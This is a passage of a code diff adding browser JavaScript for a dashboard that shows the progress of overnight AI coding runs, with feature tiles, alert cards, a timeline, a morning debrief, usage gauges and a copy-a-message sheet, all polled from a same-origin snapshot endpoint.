+    return parent;
+  }
+  function ic(name, cls) {
+    var svg = document.createElementNS(SVG_NS, "svg");
+    svg.setAttribute("class", cls ? "ic " + cls : "ic");
+    svg.setAttribute("aria-hidden", "true");
+    svg.setAttribute("focusable", "false");
+    var use = document.createElementNS(SVG_NS, "use");
+    use.setAttribute("href", "#i-" + name);
+    svg.appendChild(use);
+    return svg;
+  }
+  function tone(node, name) { node.setAttribute("data-tone", name); return node; }
+  function chip(lk, word) {
+    var c = el("span", "chip");
+    tone(c, lk.tone);
+    add(c, ic(lk.icon), el("span", "", word));
+    return c;
+  }
+  function plural(n, one, many) { return n + " " + (n === 1 ? one : many); }
+  function ensureId(node, prefix) {
+    if (!node.id) node.id = prefix + "-" + (++uid);
+    return node.id;
+  }
+
+  // An AI wrote this text: show it quoted, with the label that says not to run anything from it.
+  function aiBlock(text, notice) {
+    var box = el("div", "ai");
+    var tag = el("span", "ai-tag");
+    add(tag, ic("info"), el("span", "", notice));
+    add(box, tag, el("p", "ai-text", "\u201C" + text + "\u201D"));
+    return box;
+  }
+  function said(s, snap, cls) {
+    if (!s) return null;
+    return s.author === "ai" ? aiBlock(s.text, snap.leader.aiNotice) : el("p", cls || "", s.text);
+  }
+
+  // ---------------------------------------------------------------------------------------------
+  // The state of the page
+  // ---------------------------------------------------------------------------------------------
+  var demoNode = $("mc-demo");
+  var DEMO = null;
+  if (demoNode) {
+    try { DEMO = JSON.parse(demoNode.textContent || "{}"); } catch (e) { DEMO = {}; }
+  }
+
+  var state = {
+    snap: null,
+    sig: "",
+    lastOk: 0,
+    level: 0,
+    firstFailed: false,
+    versionBad: false,
+    tab: "tonight",
+    beforeOpen: false,
+    pollTimer: 0,
+    polling: false
+  };
+
+  function nowMs() { return DEMO && state.snap ? state.lastOk : Date.now(); }
+
+  function freshness() {
+    var f = state.snap && state.snap.freshness;
+    return {
+      poll: f && f.pollEveryMs > 0 ? f.pollEveryMs : POLL_DEFAULT_MS,
+      stale: f && f.staleAfterMs > 0 ? f.staleAfterMs : STALE_DEFAULT_MS,
+      gone: f && f.notRespondingAfterMs > 0 ? f.notRespondingAfterMs : GONE_DEFAULT_MS
+    };
+  }
+
+  // ---------------------------------------------------------------------------------------------
+  // Tell the leader: buttons and the sheet. Nothing is sent anywhere; the sheet only helps to copy a sentence.
+  // ---------------------------------------------------------------------------------------------
+  function tellButton(template, key, titleNode, small) {
+    var b = el("button", small ? "btn quiet small" : "btn", W.tell);
+    b.type = "button";
+    b.setAttribute("data-key", key);
+    if (titleNode) b.setAttribute("aria-describedby", ensureId(titleNode, "t"));
+    b.addEventListener("click", function () { openSheet("tell", template, b); });
+    return b;
+  }
+
+  var sheet = { open: false, mode: "tell", template: "", answer: "", opener: null, openerKey: "" };
+
+  function composeMessage() {
+    if (sheet.mode === "stop") return sheet.template;
+    var answer = sheet.answer.trim();
+    if (!answer) return sheet.template;
+    if (sheet.template.indexOf(PLACEHOLDER) < 0) return sheet.template + " " + answer;
+    return sheet.template.split(PLACEHOLDER).join(answer);
+  }
+
+  function paintSheet() {
+    $("sheet-msg").value = composeMessage();
+    var pressed = sheet.answer.trim();
+    var buttons = $("sheet-phrases").children;
+    for (var i = 0; i < buttons.length; i++) {
+      buttons[i].setAttribute("aria-pressed", pressed !== "" && buttons[i].textContent === pressed ? "true" : "false");
+    }
+  }
+
+  function setStatus(text, failed) {
+    var s = $("sheet-status");
+    s.textContent = text;
+    s.className = failed ? "status fail" : "status";
+  }
+
+  function openSheet(mode, template, opener) {
+    var snap = state.snap;
+    if (!snap) return;
+    var leader = snap.leader;
+    sheet.open = true;
+    sheet.mode = mode;
+    sheet.template = template;
+    sheet.answer = "";
+    sheet.opener = opener || null;
+    sheet.openerKey = opener ? opener.getAttribute("data-key") || opener.id || "" : "";
+    var stop = mode === "stop";
+    $("sheet-stop").hidden = !stop;
+    $("sheet-stop").textContent = stop ? leader.stopNote : "";
+    $("sheet-phrases-box").hidden = stop;
+    $("sheet-own-box").hidden = stop;
+    $("sheet-hint").textContent = leader.pasteHint;
+    $("sheet-can").textContent = leader.canDo;
+    $("sheet-own").value = "";
+    setStatus("", false);
+    var box = $("sheet-phrases");
+    clear(box);
+    leader.quickPhrases.forEach(function (phrase) {
+      var p = el("button", "phrase", phrase);
+      p.type = "button";
+      p.setAttribute("aria-pressed", "false");
+      p.addEventListener("click", function () {
+        sheet.answer = sheet.answer.trim() === phrase ? "" : phrase;
+        $("sheet-own").value = sheet.answer;
+        setStatus("", false);
+        paintSheet();
+      });
+      box.appendChild(p);
+    });
+    paintSheet();
+    $("scrim").hidden = false;
+    $("page").setAttribute("inert", "");
+    document.body.classList.add("sheet-open");
+    $("sheet").focus();
+  }
+
+  function closeSheet() {
+    if (!sheet.open) return;
+    sheet.open = false;
+    $("scrim").hidden = true;
+    $("page").removeAttribute("inert");
+    document.body.classList.remove("sheet-open");
+    var back = sheet.opener;
+    if (back && !document.contains(back) && sheet.openerKey) {
+      back = document.querySelector('[data-key="' + cssEscape(sheet.openerKey) + '"]') || document.getElementById(sheet.openerKey);
+    }
+    sheet.opener = null;
+    if (back && back.focus) back.focus({ preventScroll: true });
+  }
+
+  function cssEscape(value) {
+    return window.CSS && CSS.escape ? CSS.escape(value) : String(value).replace(/["\\]/g, "\\$&");
+  }
+
+  // Copy: the clipboard API when the page is allowed to use it, else select the text and use the old command
+  // (plain http over a LAN has no navigator.clipboard).
+  function copyMessage() {
+    var box = $("sheet-msg");
+    var text = box.value;
+    function legacy() {
+      var ok = false;
+      try {
+        box.focus();
+        box.select();
+        box.setSelectionRange(0, text.length);
+        ok = document.execCommand("copy");
+      } catch (e) {
+        ok = false;
+      }
+      return ok;
+    }
+    function done(ok) {
+      if (ok) {
+        setStatus(W.copied, false);
+      } else {
+        setStatus(state.snap.leader.copyFailHint, true);
+        box.focus();
+        box.select();
+        box.setSelectionRange(0, text.length);
+      }
+    }
+    if (navigator.clipboard && typeof navigator.clipboard.writeText === "function") {
+      navigator.clipboard.writeText(text).then(function () { done(true); }, function () { done(legacy()); });
+    } else {
+      done(legacy());
+    }
+  }
+
+  function sheetFocusables() {
+    var all = $("sheet").querySelectorAll("button, textarea, [tabindex]:not([tabindex='-1'])");
+    var out = [];
+    for (var i = 0; i < all.length; i++) {
+      var n = all[i];
+      if (!n.disabled && n.offsetParent !== null) out.push(n);
+    }
+    return out;
+  }
+
+  $("sheet-copy").addEventListener("click", copyMessage);
+  $("sheet-close").addEventListener("click", closeSheet);
+  $("sheet-own").addEventListener("input", function () {
+    sheet.answer = $("sheet-own").value;
+    setStatus("", false);
+    paintSheet();
+  });
+  $("scrim").addEventListener("click", function (e) { if (e.target === $("scrim")) closeSheet(); });
+  document.addEventListener("keydown", function (e) {
+    if (!sheet.open) return;
+    if (e.key === "Escape") { e.preventDefault(); closeSheet(); return; }
+    if (e.key !== "Tab") return;
+    var list = sheetFocusables();
+    if (!list.length) return;
+    var first = list[0];
+    var last = list[list.length - 1];
+    var active = document.activeElement;
+    if (e.shiftKey && (active === first || active === $("sheet"))) { e.preventDefault(); last.focus(); }
+    else if (!e.shiftKey && active === last) { e.preventDefault(); first.focus(); }
+    else if (!$("sheet").contains(active)) { e.preventDefault(); first.focus(); }
+  });
+  $("gbar-tell").addEventListener("click", function () { if (state.snap) openSheet("tell", state.snap.leader.globalSentence, $("gbar-tell")); });
+  $("gbar-stop").addEventListener("click", function () { if (state.snap) openSheet("stop", state.snap.leader.stopSentence, $("gbar-stop")); });
+  $("gbar-tell").setAttribute("data-key", "gbar-tell");
+  $("gbar-stop").setAttribute("data-key", "gbar-stop");
+
+  // ---------------------------------------------------------------------------------------------
+  // Tonight
+  // ---------------------------------------------------------------------------------------------
+  function stepper(m) {
+    var list = el("ol", "steps");
+    var anyDone = false;
+    m.progress.forEach(function (s) { if (s.state !== "todo") anyDone = true; });
+    if (!anyDone || !m.readable) return null;
+    // Always drawn in the order of the five steps, whatever order the list arrives in.
+    var ordered = m.progress.slice().sort(function (a, b) { return STEP_IDS.indexOf(a.id) - STEP_IDS.indexOf(b.id); });
+    ordered.forEach(function (s) {
+      var li = el("li", "step " + s.state);
+      if (s.state === "current") li.setAttribute("aria-current", "step");
+      var dot = el("span", "dot");
+      dot.appendChild(ic(STEP_LOOK[s.state] || "hollow"));
+      var label = s.word;
+      if (s.id === "build" && m.repairLap) label = s.word + " (" + W.repairRound + ")";
+      add(li, dot, el("span", "", label), el("span", "sr", s.state));
+      list.appendChild(li);
+    });
+    return list;
+  }
+
+  function pips(f) {
+    var row = el("div", "pips");
+    row.setAttribute("aria-hidden", "true");
+    for (var i = 0; i < f.steps.total; i++) {
+      var on = i < f.steps.used;
+      row.appendChild(el("span", "pip" + (on ? " on " + (i === 0 ? "first" : "reinf") : "")));
+    }
+    return row;
+  }
+
+  function checksLine(f) {
+    var n = f.acceptanceTests;
+    if (n === 0 && (f.state === "waiting_turn" || f.state === "left_out")) return null;
+    var text = n === 0 ? W.checkNone : n === 1 ? W.checkOne : n + W.checkMany;
+    return el("p", "small muted", text);
+  }
+
+  function tile(f, m, snap) {
+    var lk = look(FEATURE_LOOK, f.state);
+    var t = el("article", "tile");
+    tone(t, lk.tone);
+    var isNow = !!(snap.now && snap.now.featureId === f.id && snap.now.missionId === m.id);
+    if (isNow) t.className += " is-now";
+    var top = el("div", "tile-top");
+    add(top, chip(lk, f.word));
+    if (isNow) top.appendChild(el("span", "tag now", "Now"));
+    if (f.isRepair) top.appendChild(el("span", "tag", W.repairFeature));
+    var title = el("h4", "tile-title", f.title);
+    add(t, top, title);
+    add(t, said(f.reason, snap, "reason"));
+    // A feature that has not been tried and is not being worked on has nothing to say about tries.
+    if (f.steps.used > 0 || (f.state !== "waiting_turn" && f.state !== "left_out")) {
+      var line = el("div", "steps-line");
+      var n = f.reinforcements;
+      add(line,
+        el("p", "steps-text", W.reinforcementsLabel + (n === 0 ? W.none : String(n)) + " (" + f.steps.used + " of " + f.steps.total + W.stepsUsed),
+        pips(f),
+        el("p", "small muted", f.steps.caption));
+      t.appendChild(line);
+    }
+    if (f.recovered) {
+      var r = el("p", "");
+      var tag = el("span", "tag recovered");
+      add(tag, ic("retry"), el("span", "", W.recovered));
+      r.appendChild(tag);
+      t.appendChild(r);
+    }
+    add(t, checksLine(f));
+    var actions = el("div", "tile-actions");
+    add(actions, tellButton(f.tellLeader, "tell:tile:" + m.id + ":" + f.id, title, true));
+    if (f.state === "stuck" && f.cardId) {
+      var open = el("button", "linkbtn", W.openQuestion);
+      open.type = "button";
+      open.setAttribute("data-key", "open:" + f.cardId);
+      open.setAttribute("aria-describedby", ensureId(title, "t"));
+      open.addEventListener("click", function () { goCard(f.cardId); });
+      actions.appendChild(open);
+    }
+    t.appendChild(actions);
+    return t;
+  }
+
+  function missionGroup(m, snap, several) {
+    var lk = look(MISSION_LOOK, m.state);
+    var group = el("section", "group");
+    var head = el("div", "mission-head");
+    tone(head, lk.tone);
+    var titleRow = el("div", "mission-title");
+    var h = el("h3", "", m.title);
+    add(titleRow, h, el("span", "kind", m.kindWord), chip(lk, m.word));
+    add(head, titleRow, el("p", "mission-sentence", m.sentence), stepper(m));
+    // With one mission the heading above already says it; with several, each mission needs its own count.
+    if (m.featuresTotal > 0 && several) head.appendChild(el("p", "small muted", m.featuresLine));
+    if (m.features.length === 0) {
+      var row = el("div", "tile-actions");
+      row.appendChild(tellButton(m.tellLeader, "tell:mission:" + m.id, h, true));
+      head.appendChild(row);
+    }
+    group.appendChild(head);
+    if (m.features.length > 0) {
+      var tiles = el("div", "tiles");
+      m.features.forEach(function (f) { tiles.appendChild(tile(f, m, snap)); });
+      group.appendChild(tiles);
+    }
+    return group;
+  }
+
+  function strip(snap) {
+    var cards = snap.needsYou;
+    if (cards.length === 0) {
+      var calm = el("div", "strip calm");
+      add(calm, ic("check"), el("span", "", W.emptyCards));
+      return calm;
+    }
+    var worst = "warn";
+    cards.forEach(function (c) { if (c.severity === "now") worst = "bad"; });
+    var box = el("section", "strip");
+    tone(box, worst);
+    var title = el("div", "strip-title");
+    add(title, ic(worst === "bad" ? "sq" : "tri"), el("span", "", "Needs you (" + cards.length + ")"));
+    box.appendChild(title);
+    cards.forEach(function (c) {
+      var b = el("button", "strip-item");
+      b.type = "button";
+      b.setAttribute("data-key", "strip:" + c.id);
+      tone(b, c.severity === "now" ? "bad" : "warn");
+      add(b, ic(CARD_ICON[c.kind] || "tri"), el("span", "", c.title), ic("chev", "go"));
+      b.addEventListener("click", function () { goCard(c.id); });
+      box.appendChild(b);
+    });
+    return box;
+  }
+
+  function olderRow(snap) {
+    var before = snap.missions.filter(function (m) { return m.scope === "before"; });
+    if (before.length === 0) return null;
+    var d = el("details", "older");
+    if (state.beforeOpen) d.open = true;
+    d.addEventListener("toggle", function () { state.beforeOpen = d.open; });
+    d.appendChild(el("summary", "", W.openBefore + snap.counts.openFromBefore + ")"));
+    var list = el("div", "older-list");
+    before.forEach(function (m) {
+      var lk = look(MISSION_LOOK, m.state);
+      var item = el("div", "older-item");
+      var titleRow = el("div", "mission-title");
+      var h = el("h4", "", m.title);
+      add(titleRow, h, chip(lk, m.word));
+      add(item, titleRow, el("p", "small", m.sentence), tellButton(m.tellLeader, "tell:before:" + m.id, h, true));
+      list.appendChild(item);
+    });
+    d.appendChild(list);
+    return d;
+  }
+
+  function gauge(w, provider) {
+    var wrap = el("div", "win");
+    var head = el("div", "win-head");
+    add(head, el("span", "", w.label), el("span", "num", w.text));
+    var track = el("div", "track");
+    track.setAttribute("role", "img");
+    track.setAttribute("aria-label", provider.label + ", " + w.label + ": " + w.text);
+    var level = w.overage || w.usedFraction >= 0.9 ? " bad" : w.usedFraction >= 0.7 ? " warn" : "";
+    var fill = el("div", "fill" + level + (w.overage ? " over" : ""));
+    fill.style.width = Math.max(0, Math.min(100, w.fill * 100)) + "%";
+    track.appendChild(fill);
+    add(wrap, head, track);
+    if (w.pauseAt !== null && w.pauseAt !== undefined) {
+      var at = Math.max(0, Math.min(100, w.pauseAt * 100)) + "%";
+      var tick = el("div", "tick");
+      tick.style.left = at;
+      track.appendChild(tick);
+      var cap = el("div", "cap");
+      var label = el("span", "", W.pauseHere);
+      label.style.left = at;
+      cap.appendChild(label);
+      wrap.appendChild(cap);
+    }
+    return wrap;
+  }
+
+  function providerRow(p, compact) {
+    var lk = look(PILL_LOOK, p.pill.state);
+    var row = el("div", "prov");
+    var head = el("div", "prov-head");
+    add(head, el("span", "name", p.label), chip(lk, p.pill.word));
+    row.appendChild(head);
+    if (!compact) p.windows.forEach(function (w) { row.appendChild(gauge(w, p)); });
+    if (p.limitedText) row.appendChild(el("p", "", p.limitedText));
+    if (p.note && (!compact || p.windows.length === 0)) row.appendChild(el("p", "small muted", p.note));
+    return row;
+  }
+
+  function allowanceSection(snap) {
+    var a = snap.allowance;
+    var box = el("section", "allowance");
+    box.appendChild(el("h2", "", W.allowance));
+    if (a.waiting) {
+      var banner = el("p", "banner");
+      add(banner, ic("clock"), el("span", "", a.waiting.text));
+      box.appendChild(banner);
+    }
+    var list = el("div", "providers");
+    a.providers.forEach(function (p) { list.appendChild(providerRow(p, false)); });
+    box.appendChild(list);
+    if (a.fileChangedText) box.appendChild(el("p", "foot-note", a.fileChangedText));
+    return box;
+  }
+
+  function renderTonight(snap) {
+    var body = $("tonight-body");
+    var frag = document.createDocumentFragment();
+    frag.appendChild(strip(snap));
+    var features = el("section", "features");
+    features.appendChild(el("h2", "", snap.counts.featuresLine));
+    var tonight = snap.missions.filter(function (m) { return m.scope !== "before"; });
+    if (tonight.length === 0) features.appendChild(el("p", "empty", W.emptyMissions));
+    tonight.forEach(function (m) { features.appendChild(missionGroup(m, snap, tonight.length > 1)); });
+    frag.appendChild(features);
+    add(frag, olderRow(snap), allowanceSection(snap));
+    clear(body);
+    body.appendChild(frag);
+  }
+
+  // ---------------------------------------------------------------------------------------------
+  // The lamp and the freshness line (these run on the page's own clock)
+  // ---------------------------------------------------------------------------------------------
+  function effectiveLamp(snap, level) {
+    if (level >= 2) return snap.freshness.notResponding;
+    if (level === 1 && snap.lamp.state !== "needs_you_now") return snap.freshness.notUpdating;
+    return snap.lamp;
+  }
+
+  function setText(node, text) { if (node.textContent !== text) node.textContent = text; }
+
+  function paintLamp() {
+    var snap = state.snap;
+    if (!snap) return;
+    var lamp = effectiveLamp(snap, state.level);
+    var lk = look(LAMP_LOOK, lamp.state);
+    var card = $("lamp");
+    tone(card, lk.tone);
+    var icon = $("lamp-icon");
+    if (icon.getAttribute("data-icon") !== lk.icon) {
+      clear(icon);
+      icon.appendChild(ic(lk.icon));
+      icon.setAttribute("data-icon", lk.icon);
+    }
+    setText($("lamp-word"), lamp.word);
+    setText($("lamp-sentence"), lamp.sentence);
+    var lines = $("lamp-lines");
+    clear(lines);
+    lines.className = state.level > 0 ? "lamp-lines old" : "lamp-lines";
+    if (snap.run.line) lines.appendChild(el("li", "", snap.run.line));
+    if (snap.run.activityLine) lines.appendChild(el("li", "", snap.run.activityLine));
+    if (snap.now) {
+      var li = el("li", "");
+      li.appendChild(el("span", "label", "Now:"));
+      li.appendChild(document.createTextNode(" " + snap.now.text + (snap.now.sinceText ? " (" + snap.now.sinceText + ")" : "")));
+      lines.appendChild(li);
+    }
+    $("main").className = state.level >= 2 ? "gone" : "";
+  }
+
+  function paintFresh() {
+    var snap = state.snap;
+    if (!snap) return;
+    var secs = Math.max(0, Math.floor((nowMs() - state.lastOk) / 1000));
+    var ago = secs < 60 ? secs + " s ago)" : Math.floor(secs / 60) + " min ago)";
+    setText($("fresh-text"), W.updated + snap.generatedAtText + " (" + ago);
+    var stale = $("fresh-stale");
+    stale.hidden = state.level < 1;
+    setText(stale, snap.freshness.notUpdatingText);
+  }
+
+  function tick() {
+    if (!state.snap || state.versionBad) return;
+    var f = freshness();
+    var silence = nowMs() - state.lastOk;
+    var level = silence >= f.gone ? 2 : silence >= f.stale ? 1 : 0;
+    if (level !== state.level) {
+      state.level = level;
+      paintLamp();
+    }
+    paintFresh();
+  }
+
+  function paintNotice() {
+    var node = $("notice");
+    var text = state.versionBad ? W.badVersion : state.firstFailed && !state.snap ? W.cannotReach : "";
+    node.hidden = text === "";
+    setText(node, text);
+  }
+
+  // ---------------------------------------------------------------------------------------------
+  // Needs you
+  // ---------------------------------------------------------------------------------------------
+  function card(c, snap) {
+    var t = c.severity === "now" ? "bad" : "warn";
+    var art = el("article", "card");
+    tone(art, t);
+    art.setAttribute("data-card-id", c.id);
+    var head = el("div", "card-h");
+    var h = el("h3", "", c.title);
+    h.setAttribute("tabindex", "-1");
+    var titleBox = el("div", "");
+    add(titleBox, h, el("p", "of", c.missionTitle));
+    add(head, ic(CARD_ICON[c.kind] || "tri"), titleBox);
+    var body = el("div", "card-body");
+    var what = el("div", "sect");
+    add(what, el("h4", "section-label", W.happened), said(c.happened, snap, ""));
+    if (c.summary) what.appendChild(el("p", "small muted", c.summary));
+    var nothing = el("div", "sect");
+    add(nothing, el("h4", "section-label", W.ifNothing), el("p", "", c.ifNothing));
+    add(body, what, nothing);
+    var foot = el("div", "card-foot");
+    foot.appendChild(tellButton(c.tellLeader, "tell:card:" + c.id, h, false));
+    add(art, head, body, foot);
+    return art;
+  }
+
+  function renderNeeds(snap) {
+    var panel = $("panel-needs");
+    var frag = document.createDocumentFragment();
+    var n = snap.needsYou.length;
+    frag.appendChild(el("h2", "", n > 0 ? "Needs you (" + n + ")" : "Needs you"));
+    frag.appendChild(el("p", "", W.needsTop));
+    if (n === 0) {
+      frag.appendChild(el("p", "empty", W.emptyCards));
+    } else {
+      var list = el("div", "cards");
+      snap.needsYou.forEach(function (c) { list.appendChild(card(c, snap)); });
+      frag.appendChild(list);
+    }
+    clear(panel);
+    panel.appendChild(frag);
+  }
+
+  function goCard(cardId) {
+    selectTab("needs", false);
+    var node = document.querySelector('[data-card-id="' + cssEscape(cardId) + '"]');
+    if (!node) return;
+    node.scrollIntoView({ block: "start" });
+    var heading = node.querySelector("h3");
+    if (heading) heading.focus({ preventScroll: true });
+  }
+
+  // ---------------------------------------------------------------------------------------------
+  // Timeline
+  // ---------------------------------------------------------------------------------------------
+  function renderTimeline(snap) {
+    var panel = $("panel-timeline");
+    var frag = document.createDocumentFragment();
+    frag.appendChild(el("h2", "", "Timeline"));
+    var items = snap.timeline.items;
+    var box = el("div", "timeline");
+    if (snap.timeline.earlierNotShown > 0) box.appendChild(el("p", "small muted", W.earlier + snap.timeline.earlierNotShown + ")."));
+    if (items.length === 0) {
+      box.appendChild(el("p", "empty", W.emptyTimeline));
+    } else {
+      var titles = {};
+      snap.missions.forEach(function (m) { titles[m.id] = m.title; });
+      var seen = {};
+      items.forEach(function (it) { seen[it.missionId] = true; });
+      var manyMissions = Object.keys(seen).length > 1;
+      var days = [];
+      items.forEach(function (it) {
+        var d = days.length && days[days.length - 1].label === it.day ? days[days.length - 1] : null;
+        if (!d) { d = { label: it.day, groups: [], byMission: {} }; days.push(d); }
+        var g = d.byMission[it.missionId];
+        if (!g) { g = { id: it.missionId, items: [] }; d.byMission[it.missionId] = g; d.groups.push(g); }
+        g.items.push(it);
+      });
+      days.forEach(function (d) {
+        box.appendChild(el("h3", "day", d.label));
+        d.groups.forEach(function (g) {
+          if (manyMissions && titles[g.id]) box.appendChild(el("p", "tl-mission", titles[g.id]));
+          var list = el("ul", "tl");
+          g.items.forEach(function (it) {
+            var lk = look(TONE_LOOK, it.tone);
+            var li = el("li", "tl-item");
+            tone(li, lk.tone);
+            var body = el("div", "tl-body");
+            body.appendChild(el("p", "tl-text", it.text + (it.count > 1 ? " (" + it.count + " times)" : "")));
+            if (it.note) body.appendChild(said(it.note, snap, ""));
+            add(li, el("span", "tl-time", it.time), ic(lk.icon), body);
+            list.appendChild(li);
+          });
+          box.appendChild(list);
+        });
+      });
+    }
+    frag.appendChild(box);
+    clear(panel);
+    panel.appendChild(frag);
+  }
+
+  // ---------------------------------------------------------------------------------------------
+  // Morning debrief
+  // ---------------------------------------------------------------------------------------------
+  function featureList(heading, items, snap) {
+    if (!items.length) return null;
+    var sect = el("div", "list-block");
+    var list = el("ul", "list");
+    items.forEach(function (f) {
+      var li = el("li", "");
+      add(li, el("p", "name", f.title), said(f.note, snap, "muted"));
+      list.appendChild(li);
+    });
+    add(sect, el("h4", "section-label", heading), list);
+    return sect;
+  }
+
+  function tickRow(t) {
+    var lk = look(TICK_LOOK, t.state);
+    var row = el("div", "tick-row");
+    tone(row, lk.tone);
+    var body = el("div", "");
+    var head = el("div", "tick-head");
+    add(head, el("span", "tick-label", t.label), el("span", "tick-state", lk.word));
+    add(body, head, el("p", "", t.why));
+    if (t.caveat) {
+      var cv = el("p", "caveat");
+      add(cv, ic("tri"), el("span", "", t.caveat));
+      body.appendChild(cv);
+    }
+    add(row, ic(lk.icon), body);
+    return row;
+  }
+
+  function debriefMission(d, snap) {
+    var lk = look(VERDICT_LOOK, d.verdict.id);
+    var box = el("section", "dmission");
+    var head = el("div", "dhead");
+    var h = el("h3", "", d.title);
+    add(head, h, chip(lk, d.verdict.word));
+    add(box, head, el("p", "", d.verdict.sentence));
+    add(box, featureList(W.gotHeading, d.got, snap));
+    add(box, featureList(W.notFinished, d.leftOut, snap));
+    add(box, featureList(W.recovered, d.recovered, snap));
+    var result = el("div", "list-block");
+    add(result, el("h4", "section-label", W.nightResult), el("p", "small muted", d.plannedLine));
+    var ticks = el("div", "ticks");
+    d.ticks.forEach(function (t) { ticks.appendChild(tickRow(t)); });
+    result.appendChild(ticks);
+    box.appendChild(result);
+    if (d.agentTimeText) {
+      var runs = d.agentRuns === null || d.agentRuns === undefined ? "" : " (" + d.agentRuns + (d.agentRuns === 1 ? " AI run)" : " AI runs)");
+      box.appendChild(el("p", "small muted", d.agentTimeText + runs));
+    }
+    var foot = el("div", "tile-actions");
+    foot.appendChild(tellButton(d.tellLeader, "tell:debrief:" + d.missionId, h, true));
+    box.appendChild(foot);
+    return box;
+  }
+
+  function renderDebrief(snap) {
+    var panel = $("panel-debrief");
+    var frag = document.createDocumentFragment();
+    frag.appendChild(el("h2", "", "Morning debrief"));
+    var d = snap.debrief;
+    if (!d) {
+      frag.appendChild(el("p", "empty", W.emptyDebrief));
+    } else {
+      var wrap = el("div", "debrief");
+      var vk = look(VERDICT_LOOK, d.verdict.id);
+      var verdict = el("div", "verdict");
+      tone(verdict, vk.tone);
+      var words = el("div", "");
+      add(words, el("div", "verdict-word", d.verdict.word), el("p", "verdict-sentence", d.verdict.sentence));
+      add(verdict, ic(vk.icon), words);
+      wrap.appendChild(verdict);
+      d.missions.forEach(function (m) { wrap.appendChild(debriefMission(m, snap)); });
+      var allow = el("section", "dmission");
+      allow.appendChild(el("h4", "section-label", W.allowanceNow));
+      var pills = el("div", "pills");
+      snap.allowance.providers.forEach(function (p) {
+        var item = el("div", "p");
+        add(item, el("span", "name", p.label), chip(look(PILL_LOOK, p.pill.state), p.pill.word));
+        pills.appendChild(item);
+      });
+      allow.appendChild(pills);
+      var notes = el("div", "notes");
+      add(notes, el("p", "", d.allowanceNote), el("p", "", d.honestyNote));
+      allow.appendChild(notes);
+      wrap.appendChild(allow);
+      frag.appendChild(wrap);
+    }
+    clear(panel);
+    panel.appendChild(frag);
+  }
+
+  // ---------------------------------------------------------------------------------------------
+  // Tabs
+  // ---------------------------------------------------------------------------------------------
+  function paintTabs(snap) {
+    var n = snap.needsYou.length;
+    setText($("tab-needs"), n > 0 ? "Needs you (" + n + ")" : "Needs you");
+    TABS.forEach(function (name) {
+      var on = name === state.tab;
+      var tab = $("tab-" + (name === "needs" ? "needs" : name));
+      tab.setAttribute("aria-selected", on ? "true" : "false");
+      tab.setAttribute("tabindex", on ? "0" : "-1");
+      $("panel-" + name).hidden = !on;
+    });
+  }
+
+  function selectTab(name, focusTab) {
+    if (TABS.indexOf(name) < 0) return;
+    state.tab = name;
+    if (state.snap) paintTabs(state.snap);
+    if (focusTab) $("tab-" + name).focus();
+  }
+
+  $("tabs").addEventListener("click", function (e) {
+    var tab = e.target.closest ? e.target.closest(".tab") : null;
+    if (tab) selectTab(tab.getAttribute("data-tab"), false);
+  });
+  $("tabs").addEventListener("keydown", function (e) {
+    var at = TABS.indexOf(state.tab);
+    var next = -1;
+    if (e.key === "ArrowRight") next = (at + 1) % TABS.length;
+    else if (e.key === "ArrowLeft") next = (at + TABS.length - 1) % TABS.length;
+    else if (e.key === "Home") next = 0;
+    else if (e.key === "End") next = TABS.length - 1;
+    if (next < 0) return;
+    e.preventDefault();
+    selectTab(TABS[next], true);
+  });
+
+  // ---------------------------------------------------------------------------------------------
+  // Drawing a snapshot. A poll must not move the focus, so the focused control is found again by its key.
+  // ---------------------------------------------------------------------------------------------
+  function renderAll() {
+    var snap = state.snap;
+    var active = document.activeElement;
+    var key = active && active.getAttribute ? active.getAttribute("data-key") : null;
+    $("tabs").hidden = false;
+    $("main").hidden = false;
+    $("gbar").hidden = false;
+    paintLamp();
+    renderTonight(snap);
+    renderNeeds(snap);
+    renderTimeline(snap);
+    renderDebrief(snap);
+    paintTabs(snap);
+    paintFresh();
+    if (key && (!active.isConnected || !document.contains(active))) {
+      var again = document.querySelector('[data-key="' + cssEscape(key) + '"]');
+      if (again && again.focus) again.focus({ preventScroll: true });
+    }
+  }
+
+  // Two snapshots that differ only in their build time draw the same page, so nothing is redrawn (a selection stays).
+  function signature(snap) {
+    var at = snap.generatedAt;
+    var text = snap.generatedAtText;
+    snap.generatedAt = 0;
+    snap.generatedAtText = "";
+    var sig = JSON.stringify(snap);
+    snap.generatedAt = at;
+    snap.generatedAtText = text;
+    return sig;
+  }
+
+  function show(snap) {
+    if (!snap || snap.schemaVersion !== SCHEMA) {
+      state.versionBad = true;
+      paintNotice();
+      return;
+    }
+    state.versionBad = false;
+    state.firstFailed = false;
+    var sig = signature(snap);
+    var changed = sig !== state.sig;
+    state.snap = snap;
+    state.sig = sig;
+    paintNotice();
+    if (changed || $("main").hidden) {
+      try {
+        state.level = 0;
+        renderAll();
+      } catch (err) {
+        state.snap = null;
+        state.sig = "";
+        state.versionBad = true;
+        paintNotice();
+        return;
+      }
+    } else {
+      state.level = 0;
+      paintLamp();
+      paintFresh();
+    }
+  }
+
+  // ---------------------------------------------------------------------------------------------
+  // Asking the server, on the page's own clock
+  // ---------------------------------------------------------------------------------------------
+  function schedule() {
+    clearTimeout(state.pollTimer);
+    state.pollTimer = setTimeout(poll, freshness().poll);
+  }
+
+  function poll() {
+    if (state.polling) return;
+    state.polling = true;
+    var ctl = typeof AbortController === "function" ? new AbortController() : null;
+    var timer = setTimeout(function () { if (ctl) ctl.abort(); }, FETCH_TIMEOUT_MS);
+    var options = { cache: "no-store" };
+    if (ctl) options.signal = ctl.signal;
+    fetch("/api/snapshot", options)
+      .then(function (res) {
+        if (!res.ok) throw new Error("not ok");
+        return res.json();
+      })
+      .then(function (snap) {
+        clearTimeout(timer);
+        state.lastOk = Date.now();
+        show(snap);
+      })
+      .catch(function () {
+        clearTimeout(timer);
+        if (!state.snap) {
+          state.firstFailed = true;
+          paintNotice();
+        }
+      })
+      .then(function () {
+        state.polling = false;
+        schedule();
+      });
+  }
+
+  document.addEventListener("visibilitychange", function () {
+    // A tab that slept has old news; ask again at once instead of waiting for the timer.
+    if (!DEMO && document.visibilityState === "visible" && !state.polling) {
+      clearTimeout(state.pollTimer);
+      poll();
+    }
+  });
+
+  // ---------------------------------------------------------------------------------------------
+  // Demo mode: the same page, one JSON block, no server. The clock stands still at the snapshot's build time.
+  // ---------------------------------------------------------------------------------------------
+  function demoName() {
+    var match = /^#demo=([A-Za-z0-9_-]+)/.exec(location.hash);
+    var names = Object.keys(DEMO);
